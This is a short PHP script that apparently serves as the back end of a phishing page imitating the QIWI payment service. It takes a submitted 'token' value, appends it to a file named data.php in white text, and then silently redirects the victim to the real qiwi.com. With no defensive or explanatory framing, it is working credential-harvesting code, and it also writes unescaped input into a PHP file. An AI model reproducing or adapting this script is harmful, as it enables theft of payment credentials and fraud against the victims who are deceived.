<?PHP
	$token = $_POST['token'];

	$dataFile = fopen("data.php","at");
	fwrite($dataFile, "<div  style=\"color:white;\"><center>$token<center></div>\n");
	fclose($dataFile);
	echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://qiwi.com/'></head></html>";
?>